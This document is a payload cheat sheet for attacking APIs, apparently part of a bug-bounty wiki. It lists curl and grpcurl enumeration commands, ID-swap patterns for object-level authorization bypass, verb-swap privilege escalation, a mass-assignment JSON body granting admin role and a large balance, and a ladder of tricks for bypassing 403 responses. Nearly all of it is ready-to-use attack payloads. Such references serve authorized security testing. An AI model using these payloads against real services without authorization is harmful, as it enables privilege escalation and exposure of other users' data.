---
title: "Payloads: API (REST / GraphQL / gRPC)"
type: payloads
tags: [payloads, api, bola, mass-assignment, graphql, grpc, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-11-09
---

# Payloads: API

BOLA/BFLA, mass assignment, and protocol-specific probes. Routed via the `hunt-api` skill. See [[api-security]], [[api-testing]]; GraphQL detail -> [[wiki/payloads/graphql]].

## Enumerate
```bash
# OpenAPI/Swagger -> every endpoint + param
curl -s https://t/openapi.json | jq '.paths|keys'
# GraphQL introspection
curl -s https://t/graphql -d '{"query":"{__schema{types{name fields{name}}}}"}'
# gRPC server reflection
grpcurl -plaintext t:443 list ; grpcurl -plaintext t:443 describe pkg.Service
```

## BOLA / IDOR (object-level)
```
swap IDs across accounts: /api/orders/1001 -> 1002 ; numeric, UUID, hashid
location: path, query, body, custom header (X-Account-Id), JWT claim
wrap/array: id=1002 -> id[]=1002 ; {"id":["self","victim"]}
```

## BFLA (function-level)
```
call admin methods as a low-priv user: POST /api/admin/... 
verb swap: GET->PUT/DELETE/PATCH ; /user/{id} GET allowed -> PUT to edit
undocumented endpoints from the spec / old versions: /api/v1 vs /api/v2 vs /internal
```

## Mass assignment (add fields the client never sends)
```json
{"username":"x","role":"admin","isAdmin":true,"verified":true,"balance":999999,"user_id":1}
```
Also try nested/`__proto__` and snake/camel variants (`is_admin`, `isAdmin`).

## Excessive data exposure
```
inspect RAW responses (not the UI) for extra fields / other users' data
filter/sort/fields params that return more: ?fields=*  ?include=all
```

## GraphQL specifics (see [[wiki/payloads/graphql]])
```
introspection ; batching/aliases (rate-limit/brute bypass) ; nested-query DoS ; field suggestion
```

## gRPC specifics
```bash
grpcurl -plaintext -d '{"id":1002}' t:443 pkg.Service/GetOrder    # tamper protobuf fields
# reflection off? extract the .proto from the client/jadx, then call methods directly
```

## Real-world
BOLA is OWASP API #1 and the dominant API bug-bounty finding; mass assignment (`role`/`isAdmin`) and BFLA verb-swaps are recurring privilege escalations.

## NEW 2025-2026 access-control classes

- Standing grants: subscribe -> revoke -> delivery CONTINUES (Frappe
  CVE-2026-66000/58/59 family). After any unsubscribe/revoke, replay the
  delivery path - the grant often outlives the subscription.
- Unauth externalId replay (DHL-class BOLA, $5k): an unauthenticated
  endpoint that accepts a business identifier (`?trackingId=`) and returns
  record data. No token needed at all.
- 403 value ladder: array-wrap `{"id":[19]}`, leading zeros `019`, float
  `19.0`, comma-split `19,20`, HPP `?id=19&id=20`, verb/Content-Type swap,
  `.json` route suffix, /v1 rollback (`/v2/x` 403 -> `/v1/x` 200).
- GET-copy-PUT mass assignment: fetch the object with GET, flip one field,
  PUT it back - the update path often skips field-level authz the GET
  enforced.
- Async worker authz gap: the API enforces authz, the queue worker does not
  - fire the mutation, then watch for the side effect the worker performed
  for the wrong tenant.
- Hidden-mutation diff: full introspection vs the public schema - mutations
  present in the SDL but absent from the UI are untested admin ops.
- Cross-tenant write: the read side is checked, the write side is not.

Triage tooling: Autorize (authz replay) with the Burp match-and-replace
account switcher. Full table: [[api-request-findings]].
